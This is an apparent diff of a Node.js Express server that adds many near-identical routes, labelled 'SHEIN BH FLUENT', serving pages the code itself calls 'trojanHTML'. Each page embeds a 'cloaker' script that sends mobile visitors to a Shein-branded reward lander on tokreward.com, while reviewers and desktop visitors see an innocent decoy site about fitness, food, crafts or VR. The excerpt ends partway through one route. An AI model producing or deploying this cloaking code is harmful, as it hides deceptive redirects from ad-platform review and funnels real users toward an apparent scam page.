@@ -2220,9 +2265,240 @@ app.get('/947/:slug', (req, res, next) => {
 });
 
 // SHEIN BH FLUENT
-app.get('/948/:slug', (req, res, next) => {
+app.get('/9471/:slug', (req, res, next) => {
     const { slug } = req.params;
-    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Fitness Zone</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Roboto', sans-serif;
+                    background-color: #1a1a2e;
+                    color: #ffffff;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #16213e;
+                    padding: 1em;
+                    text-align: center;
+                }
+                .hero {
+                    background-image: url('https://placehold.co/1200x400/16213e/ffffff?text=${slug}+Fitness');
+                    background-size: cover;
+                    background-position: center;
+                    height: 400px;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                }
+                .hero-content {
+                    background-color: rgba(22, 33, 62, 0.7);
+                    padding: 2em;
+                    border-radius: 10px;
+                }
+                .features {
+                    display: flex;
+                    justify-content: space-between;
+                    margin-top: 2em;
+                }
+                .feature {
+                    flex-basis: 30%;
+                    background-color: #0f3460;
+                    padding: 1em;
+                    border-radius: 10px;
+                    text-align: center;
+                }
+                footer {
+                    background-color: #16213e;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 2em;
+                }
+                footer a {
+                    color: #e94560;
+                    text-decoration: none;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Fitness Zone</h1>
+            </header>
+            <div class="container">
+                <div class="hero">
+                    <div class="hero-content">
+                        <h2>Transform Your Body with ${slug}</h2>
+                        <p>Achieve your fitness goals with our expert-guided programs and state-of-the-art facilities.</p>
+                    </div>
+                </div>
+                <main>
+                    <h2>Why Choose ${slug} Fitness?</h2>
+                    <p>At ${slug} Fitness Zone, we're committed to helping you become the best version of yourself. Our tailored programs and supportive community will keep you motivated on your fitness journey.</p>
+                    <div class="features">
+                        <div class="feature">
+                            <h3>Personal Training</h3>
+                            <p>One-on-one sessions with certified trainers to maximize your results.</p>
+                        </div>
+                        <div class="feature">
+                            <h3>Group Classes</h3>
+                            <p>Energizing classes for all fitness levels, from yoga to high-intensity workouts.</p>
+                        </div>
+                        <div class="feature">
+                            <h3>Nutrition Guidance</h3>
+                            <p>Expert advice on nutrition to complement your fitness routine.</p>
+                        </div>
+                    </div>
+                </main>
+            </div>
+            <footer>
+                <p>Get fit with ${slug} &copy; 2024 ${slug} Fitness Zone | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 947 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/9472/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Culinary Adventures</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Arial', sans-serif;
+                    background-color: #f0f8ff;
+                    color: #333;
+                }
+                .wrapper {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #ff6b6b;
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                    border-radius: 10px 10px 0 0;
+                }
+                .main-content {
+                    background-color: white;
+                    padding: 2em;
+                    border-radius: 0 0 10px 10px;
+                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+                }
+                .recipe-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                    gap: 2em;
+                    margin-top: 2em;
+                }
+                .recipe-card {
+                    background-color: #ffeaa7;
+                    border-radius: 10px;
+                    padding: 1em;
+                    text-align: center;
+                }
+                .recipe-card img {
+                    max-width: 100%;
+                    border-radius: 10px;
+                }
+                footer {
+                    text-align: center;
+                    margin-top: 2em;
+                    color: #666;
+                }
+                footer a {
+                    color: #ff6b6b;
+                    text-decoration: none;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="wrapper">
+                <header>
+                    <h1>${slug}'s Culinary Journey</h1>
+                </header>
+                <main class="main-content">
+                    <h2>Welcome to ${slug}'s Kitchen</h2>
+                    <p>Embark on a flavorful adventure with ${slug}'s unique recipes and cooking tips. From comfort food to exotic cuisines, we've got something for every palate!</p>
+                    
+                    <div class="recipe-grid">
+                        <div class="recipe-card">
+                            <img src="https://placehold.co/300x200/ff6b6b/ffffff?text=${slug}'s+Special" alt="${slug}'s Special">
+                            <h3>${slug}'s Signature Dish</h3>
+                            <p>A mouthwatering fusion of local ingredients and international flavors.</p>
+                        </div>
+                        <div class="recipe-card">
+                            <img src="https://placehold.co/300x200/ffeaa7/333333?text=Seasonal+Delight" alt="Seasonal Delight">
+                            <h3>Seasonal ${slug} Delight</h3>
+                            <p>Experience the best of the season with this refreshing recipe.</p>
+                        </div>
+                        <div class="recipe-card">
+                            <img src="https://placehold.co/300x200/55efc4/ffffff?text=Veggie+Surprise" alt="Veggie Surprise">
+                            <h3>${slug}'s Veggie Surprise</h3>
+                            <p>A colorful and nutritious dish that will make you love vegetables!</p>
+                        </div>
+                    </div>
+                </main>
+                <footer>
+                    <p>Savor the flavors of life with ${slug} &copy; 2024 ${slug}'s Culinary Adventures | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+                </footer>
+            </div>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 947 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/9473/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
     const trojanHTML = `
         <!DOCTYPE html>
         <html lang="en">
@@ -2246,128 +2522,816 @@ app.get('/948/:slug', (req, res, next) => {
         margin: 0;
         padding: 0;
         height: 100%;
-        font-family: 'Lato', sans-serif;
-        background-color: #1a1a1a;
-        color: #e0e0e0;
+        font-family: 'Poppins', sans-serif;
+        background-color: #ffffff;
+        color: #333333;
     }
     .container {
         display: grid;
-        grid-template-columns: repeat(12, 1fr);
-        grid-auto-rows: minmax(100px, auto);
-        gap: 10px;
-        height: 100vh;
-        padding: 20px;
-        box-sizing: border-box;
+        grid-template-columns: 1fr 3fr;
+        grid-template-rows: auto 1fr auto;
+        min-height: 100vh;
     }
-    .item {
-        background-color: #2a2a2a;
-        padding: 20px;
-        border-radius: 5px;
-        transition: all 0.3s ease;
-    }
-    .item:hover {
-        transform: scale(1.02);
-        box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
-    }
-    .header {
+    header {
         grid-column: 1 / -1;
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-    }
-    .title {
-        font-size: 2.5rem;
-        color: #00ffff;
-        text-transform: uppercase;
-        letter-spacing: 3px;
-    }
-    .shop-info {
-        font-style: italic;
-    }
-    .main {
-        grid-column: 1 / span 8;
-        grid-row: 2 / span 2;
-    }
-    .sidebar {
-        grid-column: 9 / -1;
-        grid-row: 2 / span 2;
-    }
-    .feature {
-        grid-column: span 4;
-    }
-    .footer {
-        grid-column: 1 / -1;
+        background-color: #6c5ce7;
+        color: white;
+        padding: 1em;
         text-align: center;
     }
-    h2 {
-        color: #00ffff;
-        border-bottom: 1px solid #00ffff;
-        padding-bottom: 10px;
+    nav {
+        background-color: #a29bfe;
+        padding: 2em;
     }
-    a {
-        color: #00ffff;
+    nav ul {
+        list-style-type: none;
+        padding: 0;
+    }
+    nav ul li {
+        margin-bottom: 1em;
+    }
+    nav ul li a {
+        color: white;
         text-decoration: none;
     }
-    a:hover {
-        text-decoration: underline;
+    .content {
+        padding: 2em;
     }
-    @media (max-width: 768px) {
-        .container {
-            grid-template-columns: 1fr;
-        }
-        .main, .sidebar, .feature {
-            grid-column: 1 / -1;
-        }
+    .shop-info {
+        background-color: #dfe6e9;
+        border-radius: 5px;
+        padding: 1em;
+        margin-bottom: 2em;
+    }
+    .feature-list {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 1em;
+    }
+    .feature {
+        background-color: #74b9ff;
+        color: white;
+        padding: 1em;
+        border-radius: 5px;
+        text-align: center;
+    }
+    footer {
+        grid-column: 1 / -1;
+        background-color: #2d3436;
+        color: white;
+        text-align: center;
+        padding: 1em;
+    }
+    footer a {
+        color: #74b9ff;
+        text-decoration: none;
     }
 </style>
 </head>
 <body>
     <div class="container">
-        <header class="item header">
-            <h1 class="title">${slug} Nexus</h1>
-            <div class="shop-info">Converging realities of <strong>${slug}</strong></div>
+        <header>
+            <h1>${slug} Realm</h1>
         </header>
-        
-        <main class="item main">
-            <h2>Enter the Nexus</h2>
-            <p>Welcome to the intersection of imagination and reality. Here at ${slug} Nexus, we curate experiences that challenge your perception and expand your horizons.</p>
+        <nav>
+            <ul>
+                <li><a href="#home">Home</a></li>
+                <li><a href="#about">About</a></li>
+                <li><a href="#services">Services</a></li>
+                <li><a href="#contact">Contact</a></li>
+            </ul>
+        </nav>
+        <main class="content">
+            <div class="shop-info">
+                <p>Welcome to the magical world of: <strong>${slug}</strong></p>
+            </div>
+            <h2>Discover the Enchantment</h2>
+            <p>Step into ${slug} Realm, where dreams come alive and imagination knows no bounds. Explore our mystical offerings and embark on an unforgettable journey.</p>
+            <div class="feature-list">
+                <div class="feature">
+                    <h3>Magical Artifacts</h3>
+                    <p>Uncover ancient treasures</p>
+                </div>
+                <div class="feature">
+                    <h3>Enchanted Experiences</h3>
+                    <p>Live your fairy tale</p>
+                </div>
+                <div class="feature">
+                    <h3>Mystical Knowledge</h3>
+                    <p>Learn the secrets of the realm</p>
+                </div>
+            </div>
         </main>
-        
-        <aside class="item sidebar">
-            <h2>Nexus Updates</h2>
-            <p>Stay tuned for our next reality-bending event. The boundaries of ${slug} are ever-expanding.</p>
-        </aside>
-        
-        <div class="item feature">
-            <h3>Reality Fragments</h3>
-            <p>Collect pieces of alternate worlds</p>
-        </div>
-        
-        <div class="item feature">
-            <h3>Paradox Puzzles</h3>
-            <p>Challenge your mind with impossible riddles</p>
-        </div>
-        
-        <div class="item feature">
-            <h3>Quantum Quests</h3>
-            <p>Embark on journeys across multiple realities</p>
-        </div>
-        
-        <footer class="item footer">
-            <p>Transcend the ordinary with ${slug} &copy; 2024 ${slug} Nexus | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+        <footer>
+            <p>Enter a world of wonder with ${slug} &copy; 2024 ${slug} Realm | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
         </footer>
     </div>
 </body>
 </html>
             `;
             res.send(trojanHTML);
-            console.log(`Served 948 Trojan (${slug})`);
+            console.log(`Served 947 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/9474/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Quicksand', sans-serif;
+        background-color: #1e1e2f;
+        color: #ffffff;
+    }
+    .container {
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+    }
+    header {
+        background-color: #2a2d3e;
+        padding: 1em;
+        text-align: center;
+    }
+    h1 {
+        font-size: 2.5em;
+        margin: 0;
+        color: #ff8a65;
+    }
+    .content {
+        flex: 1;
+        padding: 2em;
+        max-width: 800px;
+        margin: 0 auto;
+    }
+    .shop-info {
+        background-color: #2a2d3e;
+        border-left: 5px solid #ff8a65;
+        padding: 1em;
+        margin-bottom: 2em;
+    }
+    .feature-cards {
+        display: flex;
+        justify-content: space-between;
+        flex-wrap: wrap;
+    }
+    .card {
+        background-color: #2a2d3e;
+        border-radius: 10px;
+        padding: 1.5em;
+        margin-bottom: 1em;
+        width: calc(33% - 1em);
+        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        transition: transform 0.3s ease;
+    }
+    .card:hover {
+        transform: translateY(-5px);
+    }
+    footer {
+        background-color: #2a2d3e;
+        color: #ffffff;
+        text-align: center;
+        padding: 1em;
+    }
+    footer a {
+        color: #ff8a65;
+        text-decoration: none;
+    }
+    @media (max-width: 768px) {
+        .card {
+            width: 100%;
+        }
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>${slug} Nebula</h1>
+        </header>
+        <div class="content">
+            <div class="shop-info">
+                <p>Exploring the cosmic wonders of: <strong>${slug}</strong></p>
+            </div>
+            <h2>Discover the Universe Within</h2>
+            <p>Welcome to ${slug} Nebula, where the boundaries of imagination and reality blur. Embark on a cosmic journey through our celestial offerings.</p>
+            <div class="feature-cards">
+                <div class="card">
+                    <h3>Stellar Experiences</h3>
+                    <p>Immerse yourself in otherworldly adventures</p>
+                </div>
+                <div class="card">
+                    <h3>Galactic Artifacts</h3>
+                    <p>Collect rare items from across the cosmos</p>
+                </div>
+                <div class="card">
+                    <h3>Nebula Insights</h3>
+                    <p>Gain wisdom from the far reaches of space</p>
+                </div>
+            </div>
+        </div>
+        <footer>
+            <p>Journey through the stars with ${slug} &copy; 2024 ${slug} Nebula | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+        </footer>
+    </div>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served 947 Trojan (${slug})`);
 });
 
 
 
+// SHEIN BH FLUENT
+app.get('/948/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Eco Adventures</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Montserrat', sans-serif;
+                    background-color: #e8f5e9;
+                    color: #2e7d32;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #4caf50;
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                    border-radius: 0 0 20px 20px;
+                }
+                .eco-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+                    gap: 2em;
+                    margin-top: 2em;
+                }
+                .eco-card {
+                    background-color: #c8e6c9;
+                    border-radius: 15px;
+                    padding: 1.5em;
+                    text-align: center;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                }
+                .eco-card img {
+                    max-width: 100%;
+                    border-radius: 10px;
+                }
+                footer {
+                    background-color: #4caf50;
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 2em;
+                    border-radius: 20px 20px 0 0;
+                }
+                footer a {
+                    color: #e8f5e9;
+                    text-decoration: none;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Eco Adventures</h1>
+            </header>
+            <div class="container">
+                <main>
+                    <h2>Discover Sustainable Travel with ${slug}</h2>
+                    <p>Embark on eco-friendly adventures that leave a positive impact on our planet. ${slug} Eco Adventures offers unique experiences that connect you with nature while preserving it for future generations.</p>
+                    <div class="eco-grid">
+                        <div class="eco-card">
+                            <img src="https://placehold.co/300x200/4caf50/ffffff?text=Green+Lodges" alt="Green Lodges">
+                            <h3>Sustainable Accommodations</h3>
+                            <p>Stay in eco-friendly lodges powered by renewable energy and built with sustainable materials.</p>
+                        </div>
+                        <div class="eco-card">
+                            <img src="https://placehold.co/300x200/4caf50/ffffff?text=Wildlife+Tours" alt="Wildlife Tours">
+                            <h3>Responsible Wildlife Encounters</h3>
+                            <p>Observe animals in their natural habitats with expert guides who prioritize animal welfare.</p>
+                        </div>
+                        <div class="eco-card">
+                            <img src="https://placehold.co/300x200/4caf50/ffffff?text=Local+Culture" alt="Local Culture">
+                            <h3>Cultural Immersion</h3>
+                            <p>Connect with local communities and support their sustainable initiatives through responsible tourism.</p>
+                        </div>
+                    </div>
+                </main>
+            </div>
+            <footer>
+                <p>Explore responsibly with ${slug} &copy; 2024 ${slug} Eco Adventures | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
 
+// SHEIN BH FLUENT
+app.get('/9481/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Virtual Reality Experience</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Orbitron', sans-serif;
+                    background-color: #000;
+                    color: #0ff;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #111;
+                    color: #0ff;
+                    text-align: center;
+                    padding: 1em;
+                    border-bottom: 2px solid #0ff;
+                }
+                .vr-showcase {
+                    display: flex;
+                    flex-wrap: wrap;
+                    justify-content: space-around;
+                    margin-top: 2em;
+                }
+                .vr-item {
+                    flex-basis: 30%;
+                    background-color: #111;
+                    margin-bottom: 2em;
+                    padding: 1em;
+                    border: 1px solid #0ff;
+                    border-radius: 10px;
+                    text-align: center;
+                }
+                .vr-item img {
+                    max-width: 100%;
+                    border-radius: 5px;
+                }
+                footer {
+                    background-color: #111;
+                    color: #0ff;
+                    text-align: center;
+                    padding: 1em;
+                    border-top: 2px solid #0ff;
+                }
+                footer a {
+                    color: #f0f;
+                    text-decoration: none;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} VR World</h1>
+            </header>
+            <div class="container">
+                <main>
+                    <h2>Step into the Future with ${slug} VR</h2>
+                    <p>Experience mind-bending virtual realities that push the boundaries of imagination. ${slug} VR World brings you cutting-edge experiences that will transform your perception of reality.</p>
+                    <div class="vr-showcase">
+                        <div class="vr-item">
+                            <img src="https://placehold.co/300x200/111111/00ffff?text=Space+Odyssey" alt="Space Odyssey">
+                            <h3>Cosmic Journey</h3>
+                            <p>Explore the vastness of space in this immersive galactic adventure.</p>
+                        </div>
+                        <div class="vr-item">
+                            <img src="https://placehold.co/300x200/111111/00ffff?text=Quantum+Realm" alt="Quantum Realm">
+                            <h3>Quantum Leap</h3>
+                            <p>Dive into the subatomic world and experience quantum phenomena firsthand.</p>
+                        </div>
+                        <div class="vr-item">
+                            <img src="https://placehold.co/300x200/111111/00ffff?text=Cyberpunk+City" alt="Cyberpunk City">
+                            <h3>Neon Nights</h3>
+                            <p>Navigate a futuristic cityscape filled with intrigue and advanced technology.</p>
+                        </div>
+                    </div>
+                </main>
+            </div>
+            <footer>
+                <p>Redefine reality with ${slug} &copy; 2024 ${slug} Virtual Reality Experience | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
 
+// SHEIN BH FLUENT
+app.get('/9482/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Artisan Crafts</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Lora', serif;
+                    background-color: #f9f3e6;
+                    color: #5d4037;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #8d6e63;
+                    color: #f9f3e6;
+                    text-align: center;
+                    padding: 1em;
+                    border-bottom: 3px solid #5d4037;
+                }
+                .craft-gallery {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                    gap: 2em;
+                    margin-top: 2em;
+                }
+                .craft-item {
+                    background-color: #d7ccc8;
+                    padding: 1em;
+                    border-radius: 10px;
+                    text-align: center;
+                    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+                }
+                .craft-item img {
+                    max-width: 100%;
+                    border-radius: 5px;
+                }
+                footer {
+                    background-color: #8d6e63;
+                    color: #f9f3e6;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 2em;
+                    border-top: 3px solid #5d4037;
+                }
+                footer a {
+                    color: #ffccbc;
+                    text-decoration: none;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Artisan Treasures</h1>
+            </header>
+            <div class="container">
+                <main>
+                    <h2>Discover Handcrafted Beauty</h2>
+                    <p>Welcome to ${slug} Artisan Crafts, where tradition meets innovation. Our collection showcases the finest handmade creations from skilled artisans around the world.</p>
+                    <div class="craft-gallery">
+                        <div class="craft-item">
+                            <img src="https://placehold.co/300x200/d7ccc8/5d4037?text=Ceramic+Vase" alt="Ceramic Vase">
+                            <h3>Earthen Elegance</h3>
+                            <p>Hand-thrown ceramic vases with intricate glazing techniques.</p>
+                        </div>
+                        <div class="craft-item">
+                            <img src="https://placehold.co/300x200/d7ccc8/5d4037?text=Woven+Basket" alt="Woven Basket">
+                            <h3>Woven Wonders</h3>
+                            <p>Intricately woven baskets using traditional methods and sustainable materials.</p>
+                        </div>
+                        <div class="craft-item">
+                            <img src="https://placehold.co/300x200/d7ccc8/5d4037?text=Wooden+Sculpture" alt="Wooden Sculpture">
+                            <h3>Carved Creations</h3>
+                            <p>Exquisite wooden sculptures that bring nature's beauty into your home.</p>
+                        </div>
+                    </div>
+                </main>
+            </div>
+            <footer>
+                <p>Celebrate craftsmanship with ${slug} &copy; 2024 ${slug} Artisan Crafts | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/9483/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Gourmet Delights</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Playfair Display', serif;
+                    background-color: #f8f9fa;
+                    color: #343a40;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #343a40;
+                    color: #f8f9fa;
+                    text-align: center;
+                    padding: 1em;
+                }
+                .menu-section {
+                    margin-top: 2em;
+                }
+                .dish-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+                    gap: 2em;
+                }
+                .dish-card {
+                    background-color: #fff;
+                    border-radius: 10px;
+                    overflow: hidden;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                }
+                .dish-card img {
+                    width: 100%;
+                    height: 200px;
+                    object-fit: cover;
+                }
+                .dish-info {
+                    padding: 1em;
+                }
+                footer {
+                    background-color: #343a40;
+                    color: #f8f9fa;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 2em;
+                }
+                footer a {
+                    color: #ffc107;
+                    text-decoration: none;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Gourmet Experiences</h1>
+            </header>
+            <div class="container">
+                <main>
+                    <h2>Savor Exquisite Flavors</h2>
+                    <p>Indulge in a culinary journey with ${slug} Gourmet Delights. Our master chefs craft unforgettable dishes using the finest ingredients and innovative techniques.</p>
+                    <div class="menu-section">
+                        <h3>Our Signature Dishes</h3>
+                        <div class="dish-grid">
+                            <div class="dish-card">
+                                <img src="https://placehold.co/400x200/007bff/ffffff?text=Truffle+Risotto" alt="Truffle Risotto">
+                                <div class="dish-info">
+                                    <h4>Truffle Risotto</h4>
+                                    <p>Creamy Arborio rice infused with black truffle and aged Parmesan.</p>
+                                </div>
+                            </div>
+                            <div class="dish-card">
+                                <img src="https://placehold.co/400x200/28a745/ffffff?text=Wagyu+Steak" alt="Wagyu Steak">
+                                <div class="dish-info">
+                                    <h4>Wagyu Steak</h4>
+                                    <p>Prime Wagyu beef, perfectly seared and served with seasonal vegetables.</p>
+                                </div>
+                            </div>
+                            <div class="dish-card">
+                                <img src="https://placehold.co/400x200/dc3545/ffffff?text=Chocolate+Souffle" alt="Chocolate Souffle">
+                                <div class="dish-info">
+                                    <h4>Chocolate Souffle</h4>
+                                    <p>Decadent dark chocolate souffle with vanilla bean ice cream.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+            </div>
+            <footer>
+                <p>Elevate your palate with ${slug} &copy; 2024 ${slug} Gourmet Delights | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/9484/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Music Festival</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Roboto', sans-serif;
+                    background-color: #1a1a1a;
+                    color: #ffffff;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background: linear-gradient(45deg, #ff4e50, #f9d423);
+                    text-align: center;
+                    padding: 2em;
+                }
+                .lineup {
+                    display: flex;
+                    flex-wrap: wrap;
